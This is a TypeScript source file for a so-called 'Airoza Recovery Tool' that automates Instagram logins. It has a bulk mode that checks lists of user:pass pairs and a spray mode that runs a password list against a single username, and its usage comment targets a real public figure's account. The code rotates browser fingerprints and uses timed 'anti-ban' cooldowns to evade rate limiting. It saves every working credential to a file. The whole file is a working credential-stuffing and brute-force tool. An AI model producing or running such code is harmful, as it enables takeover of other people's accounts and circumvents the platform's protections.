import axios from 'axios';
import * as fs from 'fs';
import * as crypto from 'crypto';
import sodium from 'libsodium-wrappers';
import * as readline from 'readline';

/**
 * Airoza Recovery Tool - SELF-CONTAINED
 * Mode 1 (Bulk): npx ts-node src/recovery.ts accounts.txt (format user:pass)
 * Mode 2 (Spray): npx ts-node src/recovery.ts username password_list.txt
 */

const APP_ID = '936619743392459';

function askUser(question: string): Promise<string> {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    return new Promise(resolve => {
        rl.question(question, (answer) => {
            rl.close();
            resolve(answer);
        });
    });
}

const USER_AGENTS = [
    {
        ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        ch: '"Not(A:Bar";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        platform: '"Windows"'
    },
    {
        ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
        ch: '"Not(A:Bar";v="99", "Google Chrome";v="132", "Chromium";v="132"',
        platform: '"Windows"'
    },
    {
        ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        ch: '"Not(A:Bar";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        platform: '"macOS"'
    },
    {
        ua: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        ch: '"Not(A:Bar";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        platform: '"Linux"'
    }
];

async function delay(ms: number) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function encryptPassword(password: string, publicKey: string, keyId: string): Promise<string | null> {
    await sodium.ready;
    // @ts-ignore
    const api = sodium.crypto_box_seal ? sodium : sodium.default;

    const time = Math.floor(Date.now() / 1000).toString();
    const sessionKey = crypto.randomBytes(32);
    const iv = Buffer.alloc(12, 0);
    const keyIdInt = parseInt(keyId, 10);

    const cipher = crypto.createCipheriv('aes-256-gcm', sessionKey, iv);
    cipher.setAAD(Buffer.from(time));

    const encryptedPassword = Buffer.concat([
        cipher.update(password, 'utf8'),
        cipher.final()
    ]);
    const authTag = cipher.getAuthTag();

    const pubKeyBytes = api.from_hex(publicKey);
    const encryptedKey = api.crypto_box_seal(sessionKey, pubKeyBytes);

    const payload = Buffer.alloc(1 + 1 + 2 + encryptedKey.length + authTag.length + encryptedPassword.length);
    let offset = 0;
    payload.writeUInt8(1, offset++);
    payload.writeUInt8(keyIdInt, offset++);
    payload.writeUInt16LE(encryptedKey.length, offset);
    offset += 2;
    payload.set(encryptedKey, offset);
    offset += encryptedKey.length;
    payload.set(authTag, offset);
    offset += authTag.length;
    payload.set(encryptedPassword, offset);

    return `#PWD_INSTAGRAM_BROWSER:10:${time}:${payload.toString('base64')}`;
}

async function solveCheckpoint(session: any, checkpointUrl: string, username: string): Promise<boolean> {
    console.log(`\n[CHALLENGE] Starting verification process for @${username}...`);

    try {
        // 1. Fetch challenge page data
        const getChallenge = await session.get(checkpointUrl);
        const csrfToken = getChallenge.config.headers['x-csrftoken'];

        console.log(`[INFO] Verification page loaded.`);
        console.log(`[ACTION] Please check Email or SMS connected to @${username}.`);
        console.log(`[TIP] If the code doesn't arrive, type "skip" to proceed to the next password.`);

        const securityCode = await askUser('Enter 6-digit Verification Code: ');

        if (!securityCode || securityCode.toLowerCase() === 'skip') {
            console.log('[SKIP] Verification cancelled by user.');
            return false;
        }

        const params = new URLSearchParams();
        params.append('security_code', securityCode.trim());

        // Attach correct referer and CSRF
        const verifyRes = await session.post(checkpointUrl, params.toString(), {
            headers: {
                'content-type': 'application/x-www-form-urlencoded',
                'x-csrftoken': csrfToken,
                'referer': `https://www.instagram.com${checkpointUrl}`
            }
        });

        if (verifyRes.data.status === 'ok' || verifyRes.data.location === '/' || verifyRes.data.authenticated === true) {
            console.log(`[SUCCESS] Verification Successful! Account @${username} is now accessible.`);
            return true;
        } else {
            console.log(`[FAILED] Wrong Code or Expired: ${verifyRes.data.message || 'Failed'}`);
            return false;
        }
    } catch (e: any) {
        console.error(`[ERROR] Verification failed: ${e.message}`);
        if (e.response?.data) console.log('[DEBUG] Error Details:', JSON.stringify(e.response.data));
        return false;
    }
}

async function attemptLogin(username: string, pass: string): Promise<{ success: boolean, message: string, checkpointUrl?: string, session?: any }> {
    const browser = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || USER_AGENTS[0];

    const session = axios.create({
        baseURL: 'https://www.instagram.com',
        headers: {
            'user-agent': browser!.ua,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'x-ig-app-id': APP_ID,
            'x-asbd-id': '129477',
            'x-ig-www-claim': '0',
            'x-instagram-ajax': '1',
            'x-requested-with': 'XMLHttpRequest',
            'sec-ch-ua': browser!.ch,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': browser!.platform,
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
        },
        validateStatus: () => true
    });

    try {
        const initial = await session.get('/');
        const cookies: string[] = initial.headers['set-cookie'] || [];
        const csrfCookie = cookies.find(c => c.startsWith('csrftoken='));
        let csrfToken = '';
        if (csrfCookie) {
            const part1 = csrfCookie.split(';')[0];
            if (part1) {
                const part2 = part1.split('=')[1];
                if (part2) csrfToken = part2;
            }
        }

        const keysRes = await session.get('/data/shared_data/', {
            headers: { 'referer': 'https://www.instagram.com/' }
        });
        const keys = keysRes.data?.encryption || {
            key_id: '216',
            public_key: 'f39188e898231c52a35360668d29b1f7956a8775438a0f9379ec8f12660a9f5f'
        };

        const encPass = await encryptPassword(pass, keys.public_key, keys.key_id);
        if (!encPass) return { success: false, message: 'Encryption Failed' };

        const params = new URLSearchParams();
        params.append('enc_password', encPass);
        params.append('username', username);
        params.append('queryParams', '{}');
        params.append('optIntoOneTap', 'false');

        const loginRes = await session.post('/api/v1/web/accounts/login/ajax/', params.toString(), {
            headers: {
                'content-type': 'application/x-www-form-urlencoded',
                'x-csrftoken': csrfToken,
                'referer': 'https://www.instagram.com/accounts/login/'
            }
        });

        console.log(`[RESPONSE] Data:`, JSON.stringify(loginRes.data, null, 2));

        if (loginRes.data.authenticated === true) {
            return { success: true, message: 'OK', session };
        } else if (loginRes.data.two_factor_required) {
            return { success: false, message: 'TWO_FACTOR_REQUIRED', session };
        } else if (loginRes.data.message === 'checkpoint_required' || loginRes.data.checkpoint_url) {
            return {
                success: false,
                message: 'CHECKPOINT',
                checkpointUrl: loginRes.data.checkpoint_url || '/challenge/',
                session
            };
        } else {
            return { success: false, message: loginRes.data.message || 'Login Failed', session };
        }
    } catch (e: any) {
        return { success: false, message: e.message };
    }
}

async function main() {
    const args = process.argv.slice(2);

    if (args.length === 0) {
        console.log('\n--- Airoza Recovery Tool ---');
        console.log('Mode 1 (Bulk): npx ts-node src/recovery.ts <accounts_file.txt>');
        console.log('Mode 2 (Spray): npx ts-node src/recovery.ts <username> <password_list.txt>\n');
        return;
    }

    // MODE 2: npx ts-node src/recovery.ts realdonaldtrump daftar_password.txt
    if (args.length >= 2 && !args[0]?.endsWith('.txt')) {
        const username = args[0] || '';
        const passFile = args[1] || '';

        if (!fs.existsSync(passFile)) {
            console.error(`[ERROR] Password file ${passFile} not found.`);
            return;
        }

        const passwords = fs.readFileSync(passFile, 'utf-8').split('\n').filter((l: string) => l.trim().length > 0);
        console.log(`[SAFE-SPRAY] Strategy Active: Dynamic Delay & Long Cooldown Every 5 Attempts`);
        console.log(`[SPRAY] Attempting ${passwords.length} passwords for @${username}...\n`);

        for (let i = 0; i < passwords.length; i++) {
            const pass = (passwords[i] || '').trim();

            // --- STRATEGY: LONG COOLDOWN EVERY 5 ATTEMPTS ---
            if (i > 0 && i % 5 === 0) {
                const cooldown = 60000 * 5; // 5 Minutes total rest
                console.log(`\n[!!!] ANTI-BAN: Taking a long break (5 minutes) to clear IP footprint...`);
                await delay(cooldown);
            }

            console.log(`\n[ATTEMPT ${i + 1}/${passwords.length}] @${username} : ${pass}`);

            const result = await attemptLogin(username, pass);
            if (result && result.success) {
                console.log(`\n[SUCCESS] @${username} login successful with password: ${pass}`);
                fs.appendFileSync('recovered_accounts.txt', `${username}:${pass} - OK\n`);
                return; // Stop if found
            } else {
                console.log(`[FAILED] ${result?.message}`);

                // --- STRATEGY: HANDLE CHECKPOINT MANUALLY ---
                if (result?.message === 'CHECKPOINT' && result.session) {
                    const fullUrl = result.checkpointUrl?.startsWith('http')
                        ? result.checkpointUrl
                        : `https://instagram.com${result.checkpointUrl}`;

                    console.log(`\n[!!!] SECURITY CHECKPOINT: ${fullUrl}`);

                    const solved = await solveCheckpoint(result.session, result.checkpointUrl || '/challenge/', username);

                    if (solved) {
                        console.log('[INFO] Verification success, saving account...');
                        fs.appendFileSync('recovered_accounts.txt', `${username}:${pass} - OK (Verified Checkpoint)\n`);
                        return;
                    } else {
                        console.log('[INFO] Failed to complete challenge.');
                    }
                }

                // --- STRATEGY: RATE LIMIT DETECTION ---
                if (result?.message?.includes('rate_limit') || result?.message?.includes('Please wait a few minutes')) {
                    console.error('\n[FATAL] IP Detected as Spam by Instagram. Stopping for 15 minutes!');
                    await delay(60000 * 15);
                }
            }

            // --- STRATEGY: DINAMIS DELAY (Inter-attempt) ---
            if (i < passwords.length - 1) {
                // Delay between 15 - 45 seconds (Mimicking human thinking/typing)
                const wait = 15000 + Math.random() * 30000;
                console.log(`[SAFE-WAIT] Safe wait: ${Math.round(wait / 1000)} seconds...`);
                await delay(wait);
            }
        }
    }
    // MODE 1: npx ts-node src/recovery.ts account_file.txt
    else {
        const fileName = args[0] || 'account_file.txt';
        if (!fs.existsSync(fileName)) {
            console.error(`[ERROR] File ${fileName} not found.`);
            return;
        }

        const lines = fs.readFileSync(fileName, 'utf-8').split('\n').filter((l: string) => l.trim().length > 0);
        console.log(`[SAFE-BULK] Strategy Active: Slow Mode (Human-Like, 30-60s)`);
        console.log(`[BULK] Processing ${lines.length} accounts...\n`);

        for (let i = 0; i < lines.length; i++) {
            const line = lines[i];
            if (!line) continue;
            const [user, pass] = line.split(':');
            if (!user || !pass) {
                console.warn(`[SKIP] Line ${i + 1} wrong format (User:Pass required).`);
                continue;
            }

            console.log(`[${i + 1}/${lines.length}] @${user}...`);
            const result = await attemptLogin(user.trim(), pass.trim());

            if (result.success) {
                console.log(`[SUCCESS] @${user} login successful.`);
                fs.appendFileSync('recovered_accounts.txt', `${user}:${pass} - OK\n`);
            } else {
                console.log(`[FAILED] @${user}: ${result.message}`);
                fs.appendFileSync('failed_accounts.txt', `${user}:${pass} - ${result.message}\n`);
            }

            if (i < lines.length - 1) {
                // Inter-account bulk delay: 30 - 60 seconds
                const wait = 30000 + Math.random() * 30000;
                console.log(`[SAFE-WAIT] Bulk wait: ${Math.round(wait / 1000)} seconds...`);
                await delay(wait);
            }
        }
    }
}

main().catch(console.error);
